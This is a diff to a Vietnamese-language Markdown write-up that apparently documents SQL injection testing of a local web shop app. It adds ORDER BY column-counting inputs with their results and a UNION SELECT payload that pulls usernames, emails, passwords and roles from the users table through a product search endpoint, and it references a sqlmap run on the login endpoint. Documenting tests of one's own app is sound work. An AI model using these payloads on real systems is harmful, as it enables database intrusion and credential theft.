@@ -47,7 +47,13 @@ sqlmap -u "http://localhost:8080/api/auth/login" \
 **Endpoint:** `GET /api/products/search?keyword=`  
 **UI:** `http://localhost:5500/Trang-chu.html` (ô tìm kiếm)
 
-**Payload (URL-decoded để đọc):**
+**Xác định số cột (ORDER BY) — dùng `%'` để query khớp tất cả sản phẩm:**
+```
+%' ORDER BY 8--    → 12 sản phẩm (hợp lệ)
+%' ORDER BY 9--    → 500 error  (cột 9 không tồn tại) → có đúng 8 cột
+```
+
+**Payload UNION dump users (URL-decoded để đọc):**
 ```
 %' UNION SELECT user_id, username, email, 0, password, role, 0, 'hack' FROM users-- 
 ```
